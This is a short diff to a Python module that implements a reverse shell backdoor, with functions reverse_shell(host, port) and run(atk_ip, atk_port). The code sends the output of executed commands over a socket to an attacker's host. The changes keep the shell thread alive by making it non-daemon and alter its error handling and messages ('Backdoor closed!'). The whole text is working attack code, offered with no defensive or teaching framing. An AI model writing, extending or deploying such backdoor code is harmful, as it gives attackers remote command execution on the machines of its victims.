@@ -32,8 +32,8 @@ def reverse_shell(host, port):
             stdout_value = proc.stdout.read() + proc.stderr.read()
             s.send(stdout_value or b"No output\n")
 
-    except Exception as e:
-        s.sendall(f"Error: {e}\n".encode())
+    except:
+        print("Backdoor closed!")
     finally:
         s.close()
 
@@ -48,10 +48,10 @@ def run(atk_ip: str, atk_port: str):
     try:
         port = int(atk_port)
         thread = threading.Thread(
-            target=reverse_shell, args=(atk_ip, port), daemon=True
+            target=reverse_shell, args=(atk_ip, port), daemon=False
         )
         thread.start()
     except Exception as e:
-        print("[+] Backdoor module starting...")
+        print("Error occured!")
     finally:
         return "instructions", "no_data"
